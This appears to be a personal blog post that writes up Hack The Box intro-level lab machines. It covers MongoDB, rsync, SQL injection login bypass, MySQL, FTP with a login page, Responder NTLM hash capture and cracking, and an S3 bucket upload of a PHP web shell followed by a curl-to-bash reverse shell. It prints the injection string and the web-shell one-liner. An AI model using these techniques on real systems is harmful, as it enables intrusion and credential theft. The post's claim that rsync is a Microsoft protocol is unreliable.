---
layout: default
title: Intro Track 2
date: 2025-06-15 16:43:00 +0000
categories: jekyll update
permalink: /intro2
---

# The MongoDB Box

The first box in this track deals with the MongoDB database. Although the box is relatively simple like the rest of the ones in the intro track it did lead me to learn more about databases and specifically MongoDB. As I found out, MongoDB is a NOSQL database, and my first task was figuring out what that meant. It seems that the name is a bit of a misnomer since it really means "not ONLY sql", and for most databases of this type SQL is still a valid way to interact with it. It seems that while SQL style databases are made using relational methods, i.e. columns in a table have some sort of relation to the other ones, non SQL databases are made using key-value pairs which tend to be independent from each other. This is where my database study turned into hazy territory as I still don't fully understand the implications of this difference. From what I read it is supposed to allow for better horizontal scaling (I'm assuming this means that you can add "key value" pairs more efficiently). This confuses me as I would assume that any difficulty that might come from adding too many new columns or key-value pairs would be hardware related, and couldn't be solved by storing things in a different format. Or does a NOSQL database store each column in its own file? Questions for another time I guess since I did not need any of this for the box.


Moving on to solving it we start with an NMAP scan:

![Scan](/assets/img/mongodb/scan.png)

As we can see there are 2 open ports in the system. One of which is a typical port 22 SSH connection while the other is the MongoDB service running on port 27017. As fun as it would be to bruteforce SSH credentials, the box is clearly pushing me towards MongoDB, which is where I ended up finding the flag anyways. 

Based on the way the guiding questions were nudging me, it came as no surprise that there is a CLI tool to interact with MongoDB called `mongosh`. Since I did not have it already pre-installed on my Kali system I ended up having to `curl` a tar file from the MongoDB website that would include the tool. I was a bit nervous as I always seem to have problems installing software without the package manager, but I did not even have to run a `make` command to just use the tool. In fact I didn't even have to make it executible with `chroot`. It just kind of worked with a `./` in the `bin` folder I downloaded.

Using the provided IP I connected to the database:

![Database Entry](/assets/img/mongodb/dbentry.png)

As usual, every CLI has its own syntax once you end up connecting. It is still a bit bizarre to me that software doesn't work more to standardize with stuff like `ls` and `cd` but instead a Google search showed me that we are in fact using `show` and `use` instead. 

When we `show dbs` we see a bunch of different listings. The guiding questions pushed me towards another command called `show collections` which apparently listed the subspaces within each database. More questions arose as usual, but dumping the content of each collection was straightforward using the command `db.collection.find()` (also from Google). 

I first checked `admin` as that could potentially elevate my privileges but that turned out to be a dead end. Next I skipped to `sensitive_information` since I would assume that would be the second most likely place I could find something useful. And lo and behold the flag is just sitting there:

![Flag](/assets/img/mongodb/flag.png)

Overall a simple box when you know all of this already, but without having the guided questions I would probably have spent a significant amount of time trying to figure out what to use to connect. Googling "mongodb cli" gives a completely separate binary than `mongosh` and even `apt` gives a mongodb suggestion that I could install. Thinking back I probably should have tried both of those things anyways to see whether I could have done the box another way.

Oh and I don't really understand databases enough it seems. 

# Synced

This next box deals with rsync. Luckily this was one of the things I already had some experience with. Based on my notes it seems that rsync is a Microsoft protocol for hosting shares and transfering files between machines. Unfortunately this doesn't mean that I won't have more questions about it. Off the top of my head already I thought that this was exactly why SMB was created and Telnet before it. 

Regardless, even if it seems like a redundant service, at least I kind of know what it does. So we started with a scan:

![Scan](/assets/img/synced/scan.png)

Interestingly enough, it seems I should have added some more options to my NMAP command as the scan started taking a significant amount of time compared to the previous boxes. Instead of waiting the extra four minutes (which would probably be more like 10 by the time the scan caught up) I technically cheated based on the name of the box. Since I already had in my notes that rsync typically runs on port 873, I ran a scan on only that port. That ended up giving me a much quicker scan and showed that there was in fact an open 873 running rsync. 

Once again using commands I had already written down previously I listed the shares that were available:

![Shares list](/assets/img/synced/list.png)

The second command listed what was avaliable in public. The flag was sitting there in a text file which meant that all was left was to download it. I did that in two different ways, both with the command the guiding questions suggested as well as the one that I had in my notes. For some reason they both worked:

![Flag](/assets/img/synced/flag.png)

Since the flag was in the public share I didn't have to worry about checking the other one, but it did bring up an interesting question. Based on the spacing of the output of the `list-only` command I would assume the second share is named "Anonymous Share" with a space in the middle. Except this space would cause problems in a command such as `rsync 10.10.10.10::Anonymous Share`.

Since the flag wasn't in that share, and the system kicked me out before I could test this, the question remains. Overall it was nice to do something that I at least had seen before and it was satisfying that the guided questions didn't give as much away this time.

# Appointment 

This box deals with SQL injection. Luckily this is another example of something that I've seen before. We start with another NMAP scan:

![Scan](/assets/img/appointment/scan.png)

As we can see on the scan, the box is actually a website! And indeed going to the IP address in the browser we see this to be the case:

![Site](/assets/img/appointment/site.png)

Coincidentally this login page has our entry point for the SQL injection, since we have a username and password field to play around with. Due to the nature of the questions asking me about the SQL syntax for comments, I figured that the injection would have something to do with `#`. The typical structure for a login checking SQL query is as follows:

`SELECT * FROM users WHERE username='admin' AND password='pass'`.

Granted in this case, we are unsure as to the actual values for `admin` and `pass`. Trying to use the value `username'#` is a clever trick which ends up skipping having to guess the password. Supposing we get the correct username the query would then turn into:

`SELECT * FROM users WHERE username='username'#' AND password='pass'`.

As we can see, the second portion of the query gets commented out, meaning that it ends up just checking to see if we have entered a valid username. After only two tries (administrator and admin), the username `admin'#` allowed us to log in. Logging in gave up the flag immediately: 

![Flag](/assets/img/appointment/flag.png)

I think injection vulnerabilities are always pretty interesting, so I really enjoyed this box.

# Sequel

The sequel box had to with... SQL. Specifically with the database MySQL, for which I already have some notes for. Starting with a scan, we confirm that the box is running a community version of MySQL called MariaDB on the standard port 3306:

![Scan](/assets/img/sequel/scan.png).

From working with this database previously, I already know that there is a command line utility to connect to the database with the syntax `mysql -u username -p password -h 10.10.10.10`. One of the guiding questions asked which username allowed a login without specifying a password, which gave me something to look for. I think without the questions I would have ran it through a wordlist and potentially gotten stuck. 

The username that worked ended up being `root`. This was try number three after first trying `admin` and `administrator`.

![Logging in](/assets/img/sequel/dbentry.png)

From this point onwards I was quite thankful I had already taken the effort to include a table of commands in my notes on how to interact with a MySQL database. First we list the available databases using `show databases`

![Databases](/assets/img/sequel/dblist.png).

The only database that is not present by default is `htb`, which mostly likely means that the flag is locate here as well. `use htb` allows us to switch our location and we can then list the tables using `show tables`.

![Tables](/assets/img/sequel/tables.png)

Using SQL, `SELECT * FROM table` will show the values. The flag was entry number five in the first table.

![Flag](/assets/img/sequel/flag.png).

# Crocodile 

This was the first box that ended up dealing with more than just a single concept. Even if it was just another extra step. We start with a scan as usual:

![Scan](/assets/img/crocodile/scan.png).

The `-sC` flag runs some default scripts from NMAP, which gave us some extra information. In particular we notice two services, an FTP server running on port 21, and an Apache HTTP server. 

Starting with the FTP server, already based on the NMAP script results we know that anonymous access is allowed. Logging into the server we can download its available files:

![FTP Server](/assets/img/crocodile/ftp_elevate.png)

`cat`-ing the files we see that it is actually a username and password list.

![Downloaded Files](/assets/img/crocodile/userpasslist.png)

Next, we need a place to use these credentials. The FTP server wouldn't help since we can already gain access anonymously. So we move on to the other open service.

Entering the IP in a browser displays the following site:

![Site](/assets/img/crocodile/site.png)

After clicking around for a bit we were not able to find anything useful. Step two of gaining a foothold on a website is usually directory enumeration, so using GoBuster's `dir` mode we run a scan. In particular we want PHP files, as often login pages are created with a PHP extension.

![Directory Enumeration](/assets/img/crocodile/gobust.png)

We find a lot of different sites and files, only three of which give the HTTP 200 okay code. `login.php` looks the most promising to try out our new credentials. After trying a couple, the admin login works and sends us directly to the server management dashboard, which has our flag.

![Flag](/assets/img/crocodile/flag.png)

# Responder

Another box that ended up taking a couple of steps. Starting with a standard NMAP scan:

![Scan](/assets/img/responder/scan.png).

We see that there are two ports open on the machine, one that is running a website, and another that is running WinRM which stands for Windows Remote Management and is a protocol to do just that.

Starting with the site, when we go to enter the IP in the browser, at first the site does not load. Looking at the URL, we notice that the site redirected us to the URL `unika.htb`. Luckily I've run into this problem before, and the issue here is that after the redirect replaces our URL, we no longer store it and the browser has no idea which IP corresponds to `unika.htb`. The solution is to add `10.10.10.10 unika.htb` to my hosts file so that it is resolved in the future. After adding the line to the hosts file, we are presented with the site:

![Site](/assets/img/responder/site.png).

If I was doing this blind, I probably would have started directory enumeration here, since there are no clear points of entry on the page, but the guiding questions pointed towards how the URL changes when the language of the page is switched. In particular, the URL becomes `unika.htb/index.php?page=french.html`. This means that if the URL's are not sanitized, we have access to a potential file inclusion vulnerability.

Since the box is called Responder... it would make sense to use a tool such as `responder` which is able to steal NTLM hashes from a file inclusion vulnerability. 

From what I understand about Windows authentication, it uses hashes in a format called NTLM. When a user tries to log in remotely using WinRM, the box would send a challenge string which the user would then encode with their password and send back. The box would then do the same to a fresh challenge string and compare the results. If they match, we're able to verify that the password that is stored on the server and the password that the user provides are the same, without ever sending across the connection. What we can do with responder, is create a fake SMB server to load files from. We can then send a request to a fake file through the URL inclusion so that the web server tries to connect to this service using whatever account is running the website (usually a privileged admin account). To do so, it encrypts a challenge string that Responder gives it and sends it back. We are then in possession of a challenge string and the result of it passing through a hash function with the admin password.

![File Inclusion](/assets/img/responder/inclusion.png)

![Hash](/assets/img/responder/ntlmhash.png)

While we can't exactly reverse the hash function, we can continuously encode the challenge string with different passwords we want to test. When the result matches, we have found the correct password. John the Ripper is a tool I've used before that has this functionality. In the past I remember John required a lot of different flags to specify the hash type and what exactly we wanted John to do with it, but for some reason the command ran fine with just a wordlist this time. I did however have to try twice, since the first wordlist I used was too small and did not contain the password.

![John](/assets/img/responder/john.png)

Next steps probably should have been to run GoBuster to try and find a login page to use these credentials. Unfortunately the guiding questions asked about the second service WinRM, so I knew that's where I needed to go. From my notes I found a utility called `evil-winrm` which would allow me to connect. There are a lot of features in the script besides just connections but it still provided that functionality if I had the valid credentials. On a side-note, I assumed there was another method to connect to WinRM from Linux for legitimate users, since I doubt they would be using software with "evil" in its name, yet I was unable to find a different method. 

Regardless using WinRM we are able to login:

![Evil Login](/assets/img/responder/evilwinrm.png) 

After checking each directory in the admin account I was unable to find the flag. A `cd ..` from the initial entry point led me to the other user accounts including one for a user called `mike`. The flag ended up being a file in his Desktop directory.

![Flag](/assets/img/responder/flag.png)


# Three
Moving on up in the world, this is the most complex box yet. 

Our scan shows us two things:

![Scan](/assets/img/three/scan.png).

There is an open ssh port and a website. Going to the website we see it is for the purpose of a band called "The Toppers". 

![Site](/assets/img/three/site.png)

Looking around the site there doesn't seem to be anything of note. Once again I would have run a GoBuster scan, however the guiding question spoiled it for me, so I already knew that `s3.thetoppers.htb` was a subdomain. After adding both it and `thetoppers.htb` to my `/etc/hosts` file I came across a status page on the subdomain.

![Status](/assets/img/three/s3status.png)

Not much information, and looking at the source of the page didn't give us anything else. Google is our friend luckily and turns out S3 is a type of Amazon Web Service storage service. As is typically the case with every remote database there's going to be a CLI to interact with it. In this case it was called `awscli`. After installing it I tried to connect which failed due to a lack of configurations. I looked up how to configure, and turns out there are certain fields that need to be set. Most bizarre is that sometimes if improperly configured, AWS will ignore those fields and not use them for authentication. The question is then why is it a requirement to set the fields in the first place if they could just be ignored anyways?

Still, we can set everything to temp:

![awscli Setup](/assets/img/three/aws_setup.png)

After learning what flags needed to be set, we can first list the available buckets, and then list the contents of them. Sadly there isn't any sensitive information here.

Besides enumeration, `awscli` also allows us to add files to buckets. Using the `cp` flag we can add a generic PHP one-liner shell to the website. First we create the one-liner using `echo '<?php system($_GET["cmd"]); ?>' > shell.php`. Next we upload it to the site:

![Upload](/assets/img/three/upload.png).

After that we can simply write commands after a `?cmd=` when visiting `thetoppers.htb/shell.php`.

![Shell Proof](/assets/img/three/shellproof.png)

Technically we are the admin account and could try to find the flag through the URL commands but this poses several problems. Namely we can't really leave our current directory, or execute multiple commands at once. It would be much simpler to establish a reverse shell since then we could be in a terminal window with access. To do so requires several steps. 

We start by creating a connection shell file that we will download and execute on the site, which will establish a connection back to our machine. By creating `shell.sh` and hosting that directory on a python server we can then run `curl | bash` through our one line php shell that we already have so that we download `shell.sh` from the attacking machine and then pipe it into bash. On my machine I already have a `netcat` listener set up which is ready to receive the connection.

Turns out the flag was just one `cd ..` away from where the one-liner originally placed us.

![Flag](/assets/img/three/flag.png)

# Conclusion

This set was both easier and harder than the previous one. The boxes stepped up in complexity sure, but I'd done most of the techniques before so I at least had a starting point. It also felt good to use my notes from previous years, since that was further proof that learning didn't go to waste. I think writing each report after each box, rather than writing them all at once is the right idea, and in fact I might take it one step further and start writing the report as I'm solving it. I tend to include mistakes in the report anyways so outside of an introductory summary I won't have to go back and edit.

Things are looking up, I've figured out spellcheck (finally) and am getting more comfortable with GitHub. Ideally I'm still missing a lot of features that I would like to have on the site like stretching to accommodate wider displays or maybe even comments. A learning experience the entire way through. Here's to Track 3 next week!
